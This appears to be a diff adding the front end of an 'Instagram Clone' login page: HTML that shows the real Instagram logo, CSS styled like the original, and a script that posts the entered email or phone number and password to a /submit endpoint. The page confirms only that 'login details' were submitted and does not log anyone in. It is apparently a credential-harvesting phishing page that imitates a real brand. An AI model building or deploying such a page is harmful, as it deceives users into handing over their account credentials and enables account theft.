@@ -1,0 +1,128 @@
+HTML: public/index.html
+This is the login page interface.
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Clone</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+    </div>
+    <form id="login-form">
+      <input type="text" name="email" placeholder="Email or Phone Number" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Log In</button>
+    </form>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
+
+
+
+
+___________________________________________________________________________
+
+CSS: public/styles.css
+
+body {
+  font-family: Arial, sans-serif;
+  background-color: #fafafa;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  margin: 0;
+}
+
+.container {
+  background: #fff;
+  padding: 20px;
+  border: 1px solid #dbdbdb;
+  border-radius: 8px;
+  width: 300px;
+  text-align: center;
+}
+
+.logo img {
+  width: 150px;
+  margin-bottom: 20px;
+}
+
+input {
+  width: 100%;
+  padding: 10px;
+  margin: 10px 0;
+  border: 1px solid #dbdbdb;
+  border-radius: 5px;
+}
+
+button {
+  width: 100%;
+  padding: 10px;
+  background-color: #0095f6;
+  border: none;
+  border-radius: 5px;
+  color: white;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+button:hover {
+  background-color: #0077cc;
+}
+
+
+
+
+________________________________________________
+
+
+JavaScript: public/script.js
+
+document.getElementById("login-form").addEventListener("submit", async (event) => {
+  event.preventDefault();
+
+  const formData = new FormData(event.target);
+  const email = formData.get("email");
+  const password = formData.get("password");
+
+  try {
+    const response = await fetch("/submit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email, password }),
+    });
+
+    const result = await response.json();
+    if (result.success) {
+      alert("Login details submitted successfully!");
+    } else {
+      alert("Error submitting login details.");
+    }
+  } catch (error) {
+    console.error("Error submitting form:", error);
+    alert("An error occurred. Please try again.");
+  }
+});
+
+
+
+
+
+
+
+
+
+________________________________________________________________________
+
